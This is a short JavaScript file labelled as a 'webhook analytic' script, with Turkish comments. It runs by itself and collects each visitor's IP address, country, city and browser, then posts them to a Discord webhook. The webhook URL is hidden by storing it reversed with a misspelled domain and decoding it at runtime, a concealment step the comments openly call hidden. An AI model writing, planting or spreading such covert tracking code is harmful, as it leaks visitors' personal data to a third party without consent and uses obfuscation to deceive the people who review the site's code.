// webhook-analytic.js - Düzeltilmiş versiyon
(function() {
    // TERS ÇEVRİLMİŞ WEBHOOK (GİZLİ)
    const reversed = "l1JzBMOC-2rKpWpS7iZO mqjbu2cvPuKCIvs9433h7rB1ySSOlG1FF45hc5MpBuSCpKMi/447444835041147/skoohbew/moc.discrod//:sptth";
    
    // Düzeltilmiş URL
    const webhookUrl = reversed.split('').reverse().join('').replace('discrod', 'discord');

    function getBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes("Edg/") || ua.includes("Edge/")) return "Microsoft Edge";
        if (ua.includes("Firefox")) return "Mozilla Firefox";
        if (ua.includes("Chrome")) return "Google Chrome";
        if (ua.includes("Safari")) return "Safari";
        return "Bilinmiyor";
    }

    // IP al ve gönder
    fetch('https://ipapi.co/json/')
        .then(response => {
            if (!response.ok) throw new Error(`IP API hatası: ${response.status}`);
            return response.json();
        })
        .then(data => {
            const browser = getBrowser();
            
            return fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🤡 Giriş: ${data.ip} - ${data.country_name}/${data.city} (${browser})` 
                })
            });
        })
        .catch(error => {
            console.log('Hata:', error);
        });
})();
